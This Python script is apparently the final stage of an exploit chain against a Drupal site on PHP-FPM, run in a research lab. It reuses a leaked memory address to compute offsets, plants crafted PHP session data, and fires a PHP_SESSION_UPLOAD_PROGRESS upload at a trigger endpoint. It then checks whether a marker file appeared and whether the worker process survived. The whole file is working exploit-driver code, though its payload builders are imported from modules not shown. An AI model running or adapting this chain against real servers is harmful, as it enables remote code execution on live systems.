#!/usr/bin/env python3
"""Run only the gdb-free final zif stage from an existing repeat JSON's K_dest."""
import json
import os
import sys
import time

LAB = "/tmp/opencode/research/drupal_fpm_20261022T013000Z"
sys.path.insert(0, LAB)
import lab_repeat_one as lr  # noqa: E402
import tool  # noqa: E402
from tool import field, filepart  # noqa: E402

label = sys.argv[1] if len(sys.argv) > 1 else "r0"
path = LAB + "/arms/repeat_%s.json" % label
res = json.load(open(path))
K = res["K_dest"]
w = lr.current_worker()
if not w:
    w = lr.wait_worker(15)
if not w:
    raise SystemExit("no lab worker")
P2 = K - 0x3000
X2 = K - 0x15000
S = K + 0x18
marker = LAB + "/MARKER_PASSTHRU_" + label
try:
    os.unlink(marker)
except FileNotFoundError:
    pass
rec, geo = lr.build_final(P2, X2, S, marker)
res["final_geo"] = geo
res["final_seed"] = tool.seed(os.path.join(tool.SESS, "sess_tb1"), rec)
res["final_plant_seed"] = tool.seed(os.path.join(tool.SESS, "sess_pl1"), tool.PLANT_REC)
res["marker_path"] = marker
res["marker_before"] = os.path.exists(marker)
res["worker_before_final"] = w
r = tool.post("/exploit/sess.php", [field("form", b"x")], tag=label + "_final_plant", timeout=60, cookie="pl1")
res["final_plant"] = {"status": r["status"], "head": r["body"][:200].decode("latin1")}
time.sleep(0.7)
w4 = lr.current_worker()
res["worker_after_final_plant"] = w4
r = tool.post("/exploit/trigger.php", [field("PHP_SESSION_UPLOAD_PROGRESS", b"x"), filepart()],
              tag=label + "_final_trigger", timeout=120, cookie="tb1")
res["final_trigger"] = {"status": r["status"], "head": r["body"][:300].decode("latin1")}
time.sleep(0.8)
res["marker_after"] = os.path.exists(marker)
if res["marker_after"]:
    st = os.stat(marker)
    res["marker"] = {"size": st.st_size, "mtime_ns": st.st_mtime_ns}
w5 = lr.current_worker()
res["worker_after_final_trigger"] = w5
r = tool.post("/exploit/health.php", [field("form", b"x")], tag=label + "_final_health", timeout=30)
res["health"] = {"status": r["status"], "head": r["body"][:100].decode("latin1")}
time.sleep(0.3)
res["worker_after_health"] = lr.current_worker()
raw = open(os.path.join(tool.SESS, "sess_tb1"), "rb").read()
import hashlib
res["final_file"] = {"len": len(raw), "sha1": hashlib.sha1(raw).hexdigest(), "head": raw[:64].hex()}
res["survived"] = res["worker_after_final_trigger"] == res["worker_after_health"] == w4
res["success"] = bool(res["marker_after"] and res["survived"] and r["status"] == 200)
res["finished"] = time.time()
json.dump(res, open(path, "w"), indent=1, default=str)
print(json.dumps({k: res.get(k) for k in (
    "label", "master", "K_dest", "worker_before_final", "final_plant", "final_trigger",
    "marker_after", "worker_after_final_trigger", "worker_after_health", "health",
    "survived", "success")}, indent=1, default=str))
